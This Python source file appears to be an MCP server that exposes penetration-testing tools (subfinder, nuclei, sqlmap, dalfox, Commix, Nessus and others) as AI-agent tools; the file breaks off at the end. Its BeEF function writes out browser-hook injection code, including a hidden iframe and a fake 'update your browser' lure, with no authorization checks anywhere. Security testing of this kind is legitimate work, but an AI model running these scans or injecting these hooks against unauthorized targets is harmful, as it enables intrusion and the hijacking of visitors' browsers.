from fastmcp import FastMCP
import subprocess
import requests
import os
mcp = FastMCP("docs")

def run_command(command: list):
    """Run command via the Flask app's /api/run endpoint"""
    try:
        tool = command[0]
        args = " ".join(command[1:])
        
        response = requests.post(
            "http://localhost:6991/api/run",
            json={"tool": tool, "args": args},
            timeout=300
        )
        
        # Handle HTTP errors
        if response.status_code != 200:
            return {
                'stdout': '',
                'stderr': f'HTTP Error: {response.status_code}',
                'returncode': 1
            }
        
        # Parse JSON response
        result = response.json()
        
        # Ensure response has the expected structure
        if 'error' in result and 'stdout' not in result:
            return {
                'stdout': '',
                'stderr': result['error'],
                'returncode': 1
            }
            
        return result
    except requests.exceptions.RequestException as e:
        return {
            'stdout': '',
            'stderr': f'Request error: {str(e)}',
            'returncode': 1
        }
    except Exception as e:
        return {
            'stdout': '',
            'stderr': f'Error: {str(e)}',
            'returncode': 1
        }

@mcp.tool()
async def scan_subdomains(target: str, domain_file: bool, threads: int = 4):
    """
    Scan target domain(s) for subdomains using subfinder binary
    
    Args:
        target: Domain or file containing domains to scan
        domain_file: Whether target is a file containing domains
        threads: Number of concurrent threads to use
    """
    command = [
        "subfinder",
        "-list" if domain_file else "-domain", target,
        "-json",
        "-all", 
        "-silent",
        "-active",
        "-t", str(threads)
    ]
    return run_command(command)

@mcp.tool()
async def scan_subdomains_fast(target: str, threads: int = 4, sources: str = "crtsh,bufferover,rapiddns"):
    """
    Fast subdomain scanning using subfinder with limited sources for quick results
    
    Args:
        target: Domain to scan for subdomains
        threads: Number of concurrent threads to use (default: 50)
        sources: Comma-separated list of sources to use (default: crtsh,bufferover,rapiddns)
    """
    command = [
        "subfinder",
        "-domain", target,
        "-json",
        "-silent",
        "-active",
        "-t", str(threads),
        "-timeout", "15",
        "-sources", sources,
        "-max-time", "2"
    ]
    return run_command(command)

@mcp.tool()
async def scan_ports(target: str, file: bool, ports: str = "80,443", top_ports: bool = False, threads: int = 4):
    """
    Scan a target domain for open ports using naabu binary
    
    Args:
        target: Domain or IP to scan
        file: Whether to scan a file containing domains
        ports: Port range to scan (e.g. "80,443" or "1-1000") or number of top ports
        top_ports: Whether to scan top N ports or use port range
        threads: Number of concurrent threads (default: 20)
    """
    command = [
        "naabu",
        "-silent",
        "-nc", 
        "-c", str(threads),
        "-r", "8.8.8.8",
        "-skip-host-discovery",
        "-scan-all-ips",
        "-json"
    ]

    if file:
        command.extend(["-list", str(target)])
    else:
        command.extend(["-host", str(target)])

    if top_ports:
        command.extend(["-top-ports", str(ports)])
    else:
        command.extend(["-port", str(ports)])

    return run_command(command)

@mcp.tool()
async def analyze_http_services(target: str, file: bool, threads: int = 4):
    """
    Scan a target domain for HTTP/HTTPS services using httpx binary
    
    Args:
        target: Domain or file containing domains to scan
        file: Whether target is a file containing domains
        threads: Number of concurrent threads to use
    """
    command = [
        "httpx",
        "-silent",
        "-nc", 
        "-threads", str(threads),
        "-json",
        "-title",
        "-status-code",
        "-content-length",
        "-server",
        "-tech-detect"
    ]

    if file:
        command.extend(["-list", str(target)])
    else:
        command.extend(["-target", str(target)])

    return run_command(command)

@mcp.tool()
async def detect_cdn(target: str, resolver: str = "8.8.8.8"):
    """
    Check if a target domain is using a CDN using cdncheck binary
    
    Args:
        target: Domain to check for CDN usage
        resolver: DNS resolver to use
    """
    command = [
        "cdncheck",
        "-input", str(target),
        "-resolver", resolver,
        "-nc",
        "-duc",
        "-silent",
        "-resp",
        "-jsonl"
    ]

    return run_command(command)

@mcp.tool()
async def analyze_tls_config(target: str, file: bool, port: int = 443, resolver: str = "8.8.8.8", threads: int = 4):
    """
    Scan a target domain for TLS/SSL configuration using tlsx binary
    
    Args:
        target: Domain or file containing domains to scan
        file: Whether target is a file containing domains
        port: Port to scan for TLS
        resolver: DNS resolver to use
        threads: Number of concurrent threads to use
    """
    command = [
        "tlsx",
        "-silent",
        "-resolvers", str(resolver),
        "-nc",
        "-c", str(threads),
        "-p", str(port),
        "-json",
        "-so",
        "-tls-version",
        "-cipher",
        "-wildcard-cert",
        "-probe-status",
        "-version-enum",
        "-cipher-enum",
        "-cipher-type", "all",
        "-serial"
    ]
    if file:
        command.extend(["-l", str(target)])
    else:
        command.extend(["-u", str(target)])
    
    return run_command(command)

@mcp.tool()
async def enumerate_assets(mode: str, target: str = None, wordlist: str = None, threads: int = 4, 
                  extensions: str = None, status_codes: str = None, output: str = None,
                  resolver: str = None, append_domain: bool = True, methods: str = None,
                  project: str = None, region: str = None, server: str = None):
    """
    Unified asset enumeration using gobuster binary
    
    Args:
        mode: Gobuster mode (dir/dns/vhost/fuzz/gcs/s3/tftp)
        target: Target URL/domain/server (required for dir/dns/vhost/fuzz/tftp)
        wordlist: Path to wordlist
        threads: Number of concurrent threads
        extensions: File extensions for dir mode
        status_codes: Status codes for dir mode
        output: Output file path
        resolver: DNS resolver for dns mode
        append_domain: Append domain in vhost mode
        methods: HTTP methods for fuzz mode
        project: Project ID for gcs mode
        region: AWS region for s3 mode
        server: Server address for tftp mode
    """
    if not wordlist:
        raise ValueError("wordlist is required")
        
    command = ["gobuster", mode, "-t", str(threads), "-q"]
    
    # Add mode-specific arguments
    if mode == "dir":
        if not target:
            raise ValueError("target is required for dir mode")
        command.extend(["-u", target+"/FUZZ", "-w", wordlist])
        if extensions:
            command.extend(["-x", extensions])
        if status_codes:
            command.extend(["-s", status_codes])
            
    elif mode == "dns":
        if not target:
            raise ValueError("target is required for dns mode")
        command.extend(["-d", target, "-w", wordlist])
        if resolver:
            command.extend(["-r", resolver])
            
    elif mode == "vhost":
        if not target:
            raise ValueError("target is required for vhost mode")
        command.extend(["-u", target, "-w", wordlist])
        if not append_domain:
            command.append("--append-domain=false")
            
    elif mode == "fuzz":
        if not target:
            raise ValueError("target is required for fuzz mode")
        command.extend(["-u", target, "-w", wordlist])
        if methods:
            command.extend(["-m", methods])
            
    elif mode == "gcs":
        command.extend(["-w", wordlist])
        if project:
            command.extend(["--project", project])
            
    elif mode == "s3":
        command.extend(["-w", wordlist])
        if region:
            command.extend(["--region", region])
            
    elif mode == "tftp":
        if not server:
            raise ValueError("server is required for tftp mode")
        command.extend(["-w", wordlist, "--server", server])
    
    if output:
        command.extend(["-o", output])
        
    return run_command(command)

@mcp.tool()
async def fuzz_endpoints(target: str, threads: int = 4,
                         wordlist: str = "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/directory-list-2.3-medium.txt"):
    """
    Fuzz a target domain for hidden endpoints using ffuf binary
    
    Args:
        target: Target domain to fuzz
        threads: Number of concurrent threads to use
        wordlist: Path to wordlist to use
    """
    if "://" in wordlist:
        import tempfile
        r = requests.get(wordlist)
        # Use system temp directory instead of current working directory
        temp_dir = tempfile.gettempdir()
        filename = wordlist.split("/")[-1]
        path = os.path.join(temp_dir, filename)
        with open(path, "w") as f:
            f.write(r.text)
        wordlist = path
    else:
        if not os.path.exists(wordlist):
            raise FileNotFoundError(f"File {wordlist} not found")
    command = [
        "ffuf",
        "-s",
        "-w", wordlist,
        "-u", target+"/FUZZ",
        "-t", str(threads)
    ]
    return run_command(command)

@mcp.tool()
async def resolve_dns(target: str, file: bool, threads: int = 4, resolver: str = "8.8.8.8",
                    wordlist: str = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt"):
    """
    Run DNS enumeration using dnsx binary
    
    Args:
        target: Domain or file containing domains to scan
        file: Whether target is a file containing domains
        threads: Number of concurrent threads to use
        resolver: DNS resolver to use
        wordlist: Path to wordlist for subdomain enumeration
    """
    if "://" in wordlist:
        import tempfile
        temp_dir = tempfile.gettempdir()
        filename = wordlist.split("/")[-1]
        path = os.path.join(temp_dir, filename)
        
        # Check if wordlist already exists to avoid re-downloading
        if not os.path.exists(path):
            try:
                r = requests.get(wordlist, timeout=30)
                r.raise_for_status()
                with open(path, "w") as f:
                    f.write(r.text)
            except requests.RequestException as e:
                return {
                    'stdout': '',
                    'stderr': f'Failed to download wordlist: {str(e)}',
                    'returncode': 1
                }
        wordlist = path
    else:
        if not os.path.exists(wordlist):
            raise FileNotFoundError(f"File {wordlist} not found")
    
    command = [
        "dnsx",
        "-silent",
        "-t", str(threads),
        "-json",
        "-r", str(resolver),
        "-all",
        "-timeout", "10"
    ]
    if file:
        command.extend(["-l", str(target)])
    else:
        command.extend(["-d", str(target)])
    
    return run_command(command)

@mcp.tool()
async def crawl_website(target: str, depth: int = 3, field_scope: str = "rdn", 
                       threads: int = 4, timeout: int = 10, js_crawl: bool = False,
                       include_subs: bool = True, output_mode: str = "json"):
    """
    Web crawling and endpoint discovery using katana binary
    
    Args:
        target: Target URL to crawl
        depth: Crawling depth
        field_scope: Crawling scope (rdn/fqdn/ip)
        threads: Number of concurrent threads
        timeout: Request timeout in seconds  
        js_crawl: Enable JavaScript crawling
        include_subs: Include subdomains in crawling
        output_mode: Output format (json/plain)
    """
    command = [
        "katana",
        "-u", target,
        "-d", str(depth),
        "-fs", field_scope,
        "-c", str(threads),
        "-timeout", str(timeout),
        "-silent",
        "-nc"
    ]
    
    if js_crawl:
        command.append("-jc")
    if include_subs:
        command.append("-cs")
    if output_mode == "json":
        command.append("-jsonl")
        
    return run_command(command)

@mcp.tool()
async def scan_vulnerabilities(target: str, file: bool, templates: str = None, 
                             severity: str = None, tags: str = None, threads: int = 4,
                             timeout: int = 5, retries: int = 1, rate_limit: int = 150,
                             exclude_tags: str = None, include_tags: str = None):
    """
    Vulnerability scanning using nuclei binary
    
    Args:
        target: Target URL/domain or file containing targets
        file: Whether target is a file containing URLs
        templates: Specific template or template directory to use
        severity: Filter by severity (info,low,medium,high,critical)
        tags: Filter by tags (e.g. "sqli,xss")
        threads: Number of concurrent threads
        timeout: Request timeout in seconds
        retries: Number of retries for failed requests
        rate_limit: Maximum requests per second
        exclude_tags: Tags to exclude from scan
        include_tags: Tags to include in scan
    """
    command = [
        "nuclei",
        "-silent",
        "-nc",
        "-j",
        "-c", str(threads),
        "-timeout", str(timeout),
        "-retries", str(retries),
        "-rl", str(rate_limit)
    ]
    
    if file:
        command.extend(["-l", target])
    else:
        command.extend(["-u", target])
        
    if templates:
        command.extend(["-t", templates])
    if severity:
        command.extend(["-s", severity])
    if tags:
        command.extend(["-tags", tags])
    if exclude_tags:
        command.extend(["-etags", exclude_tags])
    if include_tags:
        command.extend(["-itags", include_tags])
        
    return run_command(command)

@mcp.tool()
async def test_sql_injection(target: str, data: str = None, method: str = "GET",
                            cookie: str = None, headers: str = None, level: int = 1,
                            risk: int = 1, threads: int = 1, timeout: int = 30,
                            tamper: str = None, technique: str = None):
    """
    SQL injection testing using sqlmap binary
    
    Args:
        target: Target URL to test
        data: POST data to test
        method: HTTP method (GET/POST)
        cookie: Cookie values
        headers: Additional headers
        level: Level of tests (1-5)
        risk: Risk of tests (1-3)
        threads: Number of threads
        timeout: Request timeout
        tamper: Tamper script to use
        technique: SQL injection technique (B,E,U,S,T,Q)
    """
    command = [
        "sqlmap",
        "-u", target,
        "--batch",
        "--random-agent",
        "--level", str(level),
        "--risk", str(risk),
        "--threads", str(threads),
        "--timeout", str(timeout),
        "--output-dir", "/tmp/sqlmap_output"
    ]
    
    if data:
        command.extend(["--data", data])
    if method.upper() == "POST":
        command.append("--method=POST")
    if cookie:
        command.extend(["--cookie", cookie])
    if headers:
        command.extend(["--headers", headers])
    if tamper:
        command.extend(["--tamper", tamper])
    if technique:
        command.extend(["--technique", technique])
        
    return run_command(command)

@mcp.tool()
async def scan_xss(target: str, file: bool, payloads: str = None, 
                  threads: int = 4, timeout: int = 10, delay: int = 0,
                  cookie: str = None, headers: str = None, user_agent: str = None,
                  mining_dom: bool = True, mining_dict: bool = True, skip_bav: bool = True):
    """
    XSS vulnerability scanning using dalfox binary
    
    Args:
        target: Target URL or file containing URLs
        file: Whether target is a file containing URLs
        payloads: Custom payload file path
        threads: Number of concurrent workers
        timeout: Request timeout in seconds
        delay: Delay between requests in milliseconds
        cookie: Cookie values
        headers: Additional headers
        user_agent: Custom User-Agent
        mining_dom: Enable DOM mining
        mining_dict: Enable dictionary mining  
        skip_bav: Skip Basic Another Vulnerability analysis
    """
    command = [
        "dalfox",
        "url" if not file else "file",
        target,
        "-o", "json",
        "-w", str(threads),
        "--timeout", str(timeout),
        "--delay", str(delay),
        "--silence"
    ]
    
    if payloads:
        command.extend(["-P", payloads])
    if cookie:
        command.extend(["-C", cookie])
    if headers:
        command.extend(["-H", headers])
    if user_agent:
        command.extend(["-U", user_agent])
    if mining_dom:
        command.append("--mining-dom")
    if mining_dict:
        command.append("--mining-dict")
    if skip_bav:
        command.append("--skip-bav")
        
    return run_command(command)

@mcp.tool()
async def enumerate_apis(target: str, wordlist: str = None, threads: int = 4,
                        delay: int = 0, timeout: int = 3, user_agent: str = None,
                        headers: str = None, methods: str = "GET,POST",
                        status_codes: str = None, max_length: int = None):
    """
    API endpoint enumeration using kiterunner binary
    
    Args:
        target: Target URL to scan
        wordlist: Path to wordlist file
        threads: Number of concurrent threads
        delay: Delay between requests in milliseconds
        timeout: Request timeout in seconds
        user_agent: Custom User-Agent string
        headers: Additional headers (format: "key:value,key2:value2")
        methods: HTTP methods to test
        status_codes: Status codes to show
        max_length: Maximum response length to show
    """
    if not wordlist:
        # Use default API wordlist
        wordlist = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/api/api-endpoints.txt"
        
    if "://" in wordlist:
        import tempfile
        r = requests.get(wordlist)
        # Use system temp directory instead of current working directory
        temp_dir = tempfile.gettempdir()
        filename = wordlist.split("/")[-1]
        path = os.path.join(temp_dir, filename)
        with open(path, "w") as f:
            f.write(r.text)
        wordlist = path
    else:
        if not os.path.exists(wordlist):
            raise FileNotFoundError(f"File {wordlist} not found")
            
    command = [
        "kiterunner", "scan",
        target,
        "-w", wordlist,
        "-t", str(threads),
        "--delay", str(delay),
        "--timeout", str(timeout),
        "-o", "json"
    ]
    
    if user_agent:
        command.extend(["--user-agent", user_agent])
    if headers:
        command.extend(["--headers", headers])
    if methods:
        command.extend(["--methods", methods])
    if status_codes:
        command.extend(["--status-codes", status_codes])
    if max_length:
        command.extend(["--max-length", str(max_length)])
        
    return run_command(command)

@mcp.tool()
async def scan_with_zap(target: str, spider: bool = True, ajax_spider: bool = False,
                       active_scan: bool = True, passive_scan: bool = True,
                       auth_user: str = None, auth_pass: str = None,
                       session_script: str = None, context_file: str = None,
                       exclude_urls: str = None, include_urls: str = None):
    """
    Web application security scanning using OWASP ZAP
    
    Args:
        target: Target URL to scan
        spider: Enable traditional spider
        ajax_spider: Enable AJAX spider
        active_scan: Enable active vulnerability scanning
        passive_scan: Enable passive scanning
        auth_user: Authentication username
        auth_pass: Authentication password
        session_script: Session management script
        context_file: ZAP context file
        exclude_urls: URLs to exclude from scan
        include_urls: URLs to include in scan
    """
    command = [
        "zap-baseline.py" if not active_scan else "zap-full-scan.py",
        "-t", target,
        "-J", "/tmp/zap_report.json",
        "-r", "/tmp/zap_report.html"
    ]
    
    if not spider:
        command.append("-n")
    if ajax_spider:
        command.append("-j")
    if auth_user and auth_pass:
        command.extend(["-U", auth_user, "-P", auth_pass])
    if session_script:
        command.extend(["-s", session_script])
    if context_file:
        command.extend(["-c", context_file])
    if exclude_urls:
        command.extend(["-e", exclude_urls])
    if include_urls:
        command.extend(["-i", include_urls])
        
    return run_command(command)

@mcp.tool()
async def scan_secrets(target: str, scan_type: str = "filesystem", 
                      github_token: str = None, gitlab_token: str = None,
                      include_paths: str = None, exclude_paths: str = None,
                      max_depth: int = 50, threads: int = 4, 
                      output_format: str = "json", rules: str = None):
    """
    Secret scanning using trufflehog binary
    
    Args:
        target: Target to scan (path/URL/repo)
        scan_type: Type of scan (filesystem/git/github/gitlab/s3/docker)
        github_token: GitHub personal access token
        gitlab_token: GitLab access token
        include_paths: Paths to include in scan
        exclude_paths: Paths to exclude from scan
        max_depth: Maximum scan depth
        threads: Number of concurrent workers
        output_format: Output format (json/compact)
        rules: Custom rules file path
    """
    command = ["trufflehog"]
    
    if scan_type == "filesystem":
        command.extend(["filesystem", target])
    elif scan_type == "git":
        command.extend(["git", target])
    elif scan_type == "github":
        command.extend(["github", "--org=" + target if "/" not in target else "--repo=" + target])
        if github_token:
            command.extend(["--token", github_token])
    elif scan_type == "gitlab":
        command.extend(["gitlab", "--endpoint", target])
        if gitlab_token:
            command.extend(["--token", gitlab_token])
    elif scan_type == "s3":
        command.extend(["s3", "--bucket", target])
    elif scan_type == "docker":
        command.extend(["docker", "--image", target])
    
    command.extend([
        "--json" if output_format == "json" else "--no-verification",
        "-j", str(threads)
    ])
    
    if include_paths:
        command.extend(["--include-paths", include_paths])
    if exclude_paths:
        command.extend(["--exclude-paths", exclude_paths])
    if max_depth:
        command.extend(["--max-depth", str(max_depth)])
    if rules:
        command.extend(["--rules", rules])
        
    return run_command(command)

@mcp.tool()
async def scan_with_nessus(target: str, scan_template: str = "basic", 
                          nessus_url: str = "https://localhost:8834", 
                          access_key: str = None, secret_key: str = None,
                          scanner_id: int = 1, folder_id: int = 2):
    """
    Professional vulnerability scanning using Nessus
    
    Args:
        target: Target IP address, hostname, or CIDR range
        scan_template: Scan template (basic/advanced/discovery/compliance/malware)
        nessus_url: Nessus server URL
        access_key: Nessus API access key
        secret_key: Nessus API secret key
        scanner_id: Scanner ID to use
        folder_id: Folder ID for organizing scans
    """
    try:
        import json
        import uuid
        import time
        
        if not access_key or not secret_key:
            return {
                'stdout': '',
                'stderr': 'Nessus API credentials required (access_key and secret_key)',
                'returncode': 1
            }
        
        headers = {
            'X-ApiKeys': f'accessKey={access_key}; secretKey={secret_key}',
            'Content-Type': 'application/json'
        }
        
        # Get available scan templates
        templates_url = f"{nessus_url}/scans/templates"
        templates_response = requests.get(templates_url, headers=headers, verify=False)
        
        if templates_response.status_code != 200:
            return {
                'stdout': '',
                'stderr': f'Failed to get Nessus templates: {templates_response.text}',
                'returncode': 1
            }
        
        templates = templates_response.json()
        template_uuid = None
        
        # Find the requested template
        for template in templates.get('templates', []):
            if scan_template.lower() in template.get('name', '').lower():
                template_uuid = template.get('uuid')
                break
        
        if not template_uuid:
            # Use basic network scan as default
            for template in templates.get('templates', []):
                if 'basic' in template.get('name', '').lower():
                    template_uuid = template.get('uuid')
                    break
        
        if not template_uuid:
            return {
                'stdout': '',
                'stderr': 'No suitable scan template found',
                'returncode': 1
            }
        
        # Create scan
        scan_name = f"ExternalAttacker-MCP-{int(time.time())}"
        scan_data = {
            "uuid": template_uuid,
            "settings": {
                "name": scan_name,
                "description": f"Automated scan of {target}",
                "folder_id": folder_id,
                "scanner_id": scanner_id,
                "text_targets": target
            }
        }
        
        create_url = f"{nessus_url}/scans"
        create_response = requests.post(create_url, headers=headers, json=scan_data, verify=False)
        
        if create_response.status_code != 200:
            return {
                'stdout': '',
                'stderr': f'Failed to create Nessus scan: {create_response.text}',
                'returncode': 1
            }
        
        scan_info = create_response.json()
        scan_id = scan_info.get('scan', {}).get('id')
        
        # Launch scan
        launch_url = f"{nessus_url}/scans/{scan_id}/launch"
        launch_response = requests.post(launch_url, headers=headers, verify=False)
        
        if launch_response.status_code != 200:
            return {
                'stdout': '',
                'stderr': f'Failed to launch Nessus scan: {launch_response.text}',
                'returncode': 1
            }
        
        result = {
            'scan_id': scan_id,
            'scan_name': scan_name,
            'target': target,
            'template': scan_template,
            'status': 'launched',
            'message': f'Nessus scan {scan_id} launched successfully for target {target}'
        }
        
        return {
            'stdout': json.dumps(result),
            'stderr': '',
            'returncode': 0
        }
        
    except Exception as e:
        return {
            'stdout': '',
            'stderr': f'Nessus scan error: {str(e)}',
            'returncode': 1
        }

@mcp.tool()
async def exploit_with_beef(target_url: str, beef_server: str = "http://localhost:3000",
                           beef_user: str = "beef", beef_pass: str = "beef",
                           hook_method: str = "iframe", payload_modules: str = None):
    """
    Browser exploitation using BeEF (Browser Exploitation Framework)
    
    Args:
        target_url: Target website URL to inject BeEF hook
        beef_server: BeEF server URL
        beef_user: BeEF admin username
        beef_pass: BeEF admin password
        hook_method: Method to inject hook (iframe/redirect/social)
        payload_modules: Comma-separated list of BeEF modules to execute
    """
    try:
        import json
        import base64
        
        # Authenticate with BeEF
        auth_data = {
            'username': beef_user,
            'password': beef_pass
        }
        
        auth_url = f"{beef_server}/api/admin/login"
        auth_response = requests.post(auth_url, json=auth_data)
        
        if auth_response.status_code != 200:
            return {
                'stdout': '',
                'stderr': f'BeEF authentication failed: {auth_response.text}',
                'returncode': 1
            }
        
        auth_result = auth_response.json()
        beef_token = auth_result.get('token')
        
        if not beef_token:
            return {
                'stdout': '',
                'stderr': 'Failed to get BeEF authentication token',
                'returncode': 1
            }
        
        headers = {'Authorization': f'Bearer {beef_token}'}
        
        # Get BeEF hook URL
        hook_url = f"{beef_server}/hook.js"
        
        # Generate hook injection based on method
        if hook_method == "iframe":
            injection_code = f'<iframe src="{beef_server}" style="display:none;"></iframe><script src="{hook_url}"></script>'
        elif hook_method == "redirect":
            injection_code = f'<script>window.location.href="{beef_server}";setTimeout(function(){{window.location.href="{target_url}";}},1000);</script><script src="{hook_url}"></script>'
        elif hook_method == "social":
            injection_code = f'<script>alert("Please update your browser for security!");window.open("{beef_server}");</script><script src="{hook_url}"></script>'
        else:
            injection_code = f'<script src="{hook_url}"></script>'
        
        # Get hooked browsers
        hooks_url = f"{beef_server}/api/hooks"
        hooks_response = requests.get(hooks_url, headers=headers)
        
        result = {
            'beef_server': beef_server,
            'hook_url': hook_url,
            'injection_code': injection_code,
            'target_url': target_url,
            'hook_method': hook_method,
            'status': 'ready'
        }
        
        if hooks_response.status_code == 200:
            hooks_data = hooks_response.json()
            result['hooked_browsers'] = hooks_data.get('hooked-browsers', {})
            result['online_browsers'] = len([b for b in result['hooked_browsers'] if result['hooked_browsers'][b].get('online')])
        
        # Execute payload modules if specified
        if payload_modules and result.get('hooked_browsers'):
            executed_modules = []
            modules_list = payload_modules.split(',')
            
            for browser_id in result['hooked_browsers']:
                for module in modules_list:
                    module = module.strip()
                    module_url = f"{beef_server}/api/modules/{browser_id}/{module}"
                    module_response = requests.post(module_url, headers=headers, json={})
                    
                    if module_response.status_code == 200:
                        executed_modules.append({
                            'browser': browser_id,
                            'module': module,
                            'status': 'executed'
                        })
            
            result['executed_modules'] = executed_modules
        
        return {
            'stdout': json.dumps(result),
            'stderr': '',
            'returncode': 0
        }
        
    except Exception as e:
        return {
            'stdout': '',
            'stderr': f'BeEF exploitation error: {str(e)}',
            'returncode': 1
        }

@mcp.tool()
async def test_command_injection(target: str, cookie: str = None, headers: str = None,
                                data: str = None, method: str = "GET", level: int = 1,
                                technique: str = "classic", threads: int = 1,
                                timeout: int = 30, tamper: str = None):
    """
    Command injection testing using Commix
    
    Args:
        target: Target URL to test for command injection
        cookie: Cookie values for authentication
        headers: Additional HTTP headers
        data: POST data for testing
        method: HTTP method (GET/POST)
        level: Level of tests (1-3)
        technique: Injection technique (classic/eval-based/time-based/file-based)
        threads: Number of threads
        timeout: Request timeout
        tamper: Tamper script for evasion
    """
    command = [
        "commix",
        "--url", target,
        "--batch",
        "--random-agent",
        "--level", str(level),
        "--timeout", str(timeout),
        "--technique", technique
    ]
    
    if cookie:
        command.extend(["--cookie", cookie])
    if headers:
        command.extend(["--headers", headers])
    if data and method.upper() == "POST":
        command.extend(["--data", data])
    if tamper:
        command.extend(["--tamper", tamper])
    if threads > 1:
        command.extend(["--threads", str(threads)])
    
    # Add output options
    command.extend([
        "--output-dir", "/tmp/commix_output",
        "--verbose"
    ])
    
    return run_command(command)

@mcp.tool()
async def get_nessus_results(scan_id: int, nessus_url: str = "https://localhost:8834",
                            access_key: str = None, secret_key: str = None,
                            export_format: str = "nessus"):
    """
    Retrieve and export Nessus scan results
    
    Args:
        scan_id: Nessus scan ID to retrieve results for
        nessus_url: Nessus server URL
        access_key: Nessus API access key
        secret_key: Nessus API secret key
        export_format: Export format (nessus/pdf/html/csv)
    """
    try:
        import json
        import time
        
        if not access_key or not secret_key:
            return {
                'stdout': '',
                'stderr': 'Nessus API credentials required',
                'returncode': 1
            }
        
        headers = {
            'X-ApiKeys': f'accessKey={access_key}; secretKey={secret_key}',
            'Content-Type': 'application/json'
        }
        
        # Check scan status
        status_url = f"{nessus_url}/scans/{scan_id}"
        status_response = requests.get(status_url, headers=headers, verify=False)
        
        if status_response.status_code != 200:
            return {
                'stdout': '',
                'stderr': f'Failed to get scan status: {status_response.text}',
                'returncode': 1
            }
        
        scan_data = status_response.json()
        scan_status = scan_data.get('info', {}).get('status')
        
        if scan_status != 'completed':
            return {
                'stdout': json.dumps({
                    'scan_id': scan_id,
                    'status': scan_status,
                    'message': f'Scan is still {scan_status}. Please wait for completion.'
                }),
                'stderr': '',
                'returncode': 0
            }
        
        # Export scan results
        export_data = {
            "format": export_format
        }
        
        export_url = f"{nessus_url}/scans/{scan_id}/export"
        export_response = requests.post(export_url, headers=headers, json=export_data, verify=False)
        
        if export_response.status_code != 200:
            return {
                'stdout': '',
                'stderr': f'Failed to export scan: {export_response.text}',
                'returncode': 1
            }
        
        export_info = export_response.json()
        file_id = export_info.get('file')
        
        # Wait for export to complete and download
        download_url = f"{nessus_url}/scans/{scan_id}/export/{file_id}/download"
        
        # Poll for export completion
        for _ in range(30):  # Wait up to 5 minutes
            try:
                download_response = requests.get(download_url, headers=headers, verify=False)
                if download_response.status_code == 200:
                    # Save results to temp file
                    import tempfile
                    temp_dir = tempfile.gettempdir()
                    filename = f"nessus_scan_{scan_id}.{export_format}"
                    filepath = os.path.join(temp_dir, filename)
                    
                    with open(filepath, 'wb') as f:
                        f.write(download_response.content)
                    
                    result = {
                        'scan_id': scan_id,
                        'status': 'completed',
                        'export_format': export_format,
                        'file_path': filepath,
                        'file_size': len(download_response.content),
                        'vulnerabilities': scan_data.get('vulnerabilities', {}),
                        'hosts': scan_data.get('hosts', [])
                    }
                    
                    return {
                        'stdout': json.dumps(result),
                        'stderr': '',
                        'returncode': 0
                    }
            except:
                pass
            
            time.sleep(10)
        
        return {
            'stdout': '',
            'stderr': 'Export timeout - scan results may be too large',
            'returncode': 1
        }
        
    except Exception as e:
        return {
            'stdout': '',
            'stderr': f'Nessus results error: {str(e)}',
            'returncode': 1
        }

@mcp.tool()
async def upload_to_defectdojo(file_path: str, engagement_id: int, 
                              defectdojo_url: str, api_token: str,
                              scan_type: str, product_name: str = None,
                              test_title: str = None, auto_create_context: bool = True,
                              close_old_findings: bool = False, push_to_jira: bool = False):
    """
    Upload scan results to DefectDojo for vulnerability management
    
    Args:
        file_path: Path to scan results file
        engagement_id: DefectDojo engagement ID
        defectdojo_url: DefectDojo instance URL
        api_token: DefectDojo API token
        scan_type: Type of scan results (Nuclei/Nmap/OWASP ZAP/etc)
        product_name: Product name in DefectDojo
        test_title: Title for the test
        auto_create_context: Auto-create context for findings
        close_old_findings: Close old findings
        push_to_jira: Push findings to JIRA
    """
    try:
        import json
        
        headers = {
            "Authorization": f"Token {api_token}",
            "Content-Type": "application/json"
        }
        
        # Read scan results
        with open(file_path, 'r') as f:
            scan_data = f.read()
            
        upload_data = {
            "engagement": engagement_id,
            "scan_type": scan_type,
            "file": scan_data,
            "auto_create_context": auto_create_context,
            "close_old_findings": close_old_findings,
            "push_to_jira": push_to_jira
        }
        
        if test_title:
            upload_data["test_title"] = test_title
        if product_name:
            upload_data["product_name"] = product_name
            
        response = requests.post(
            f"{defectdojo_url}/api/v2/import-scan/",
            headers=headers,
            json=upload_data,
            timeout=60
        )
        
        return {
            'stdout': json.dumps(response.json()) if response.status_code == 201 else '',
            'stderr': f'Upload failed: {response.text}' if response.status_code != 201 else '',
            'returncode': 0 if response.status_code == 201 else 1
        }
        
    except Exception as e:
        return {
            'stdout': '',
            'stderr': f'DefectDojo upload error: {str(e)}',
            'returncode': 1
        }

@mcp.tool()
async def create_dradis_project(project_name: str, dradis_url: str, api_token: str,
                               description: str = None, client_name: str = None):
    """
    Create and manage projects in Dradis for reporting
    
    Args:
        project_name: Name of the project to create
        dradis_url: Dradis instance URL  
        api_token: Dradis API token
        description: Project description
        client_name: Client name for the project
    """
    try:
        import json
        
        headers = {
            "Authorization": f"Token token={api_token}",
            "Content-Type": "application/json"
        }
        
        project_data = {
            "project": {
                "name": project_name,
                "description": description or f"Security assessment for {project_name}",
                "client": client_name or "External Assessment"
            }
        }
        
        response = requests.post(
            f"{dradis_url}/pro/api/projects",
            headers=headers,
            json=project_data,
            timeout=30
        )
        
        return {
            'stdout': json.dumps(response.json()) if response.status_code == 201 else '',
            'stderr': f'Project creation failed: {response.text}' if response.status_code != 201 else '',
            'returncode': 0 if response.status_code == 201 else 1
        }
        
    except Exception as e:
        return {
            'stdout': '',
            'stderr': f'Dradis project creation error: {str(e)}',
            'returncode': 1
        }

@mcp.tool()
async def diagnose_subfinder(target: str):
    """
    Diagnose subfinder performance and configuration issues
    
    Args:
        target: Domain to test subfinder against
    """
    results = {}
    
    # Test subfinder version
    version_cmd = ["subfinder", "-version"]
    version_result = run_command(version_cmd)
    results['version'] = version_result
    
    # Test simple subfinder command
    simple_cmd = ["subfinder", "-domain", target, "-silent", "-t", "10", "-timeout", "10"]
    simple_result = run_command(simple_cmd)
    results['simple_test'] = simple_result
    
    # Test DNS resolution
    dns_cmd = ["nslookup", target]
    dns_result = run_command(dns_cmd)
    results['dns_test'] = dns_result
    
    # Test with single source only
    fast_cmd = ["subfinder", "-domain", target, "-silent", "-sources", "crtsh", "-t", "5"]
    fast_result = run_command(fast_cmd)
    results['single_source_test'] = fast_result
    
    import json
    return {
        'stdout': json.dumps(results, indent=2),
        'stderr': '',
        'returncode': 0
    }


if __name__ == "__main__":
    import os
    # Check if running in cloud environment
    if os.environ.get('PORT'):
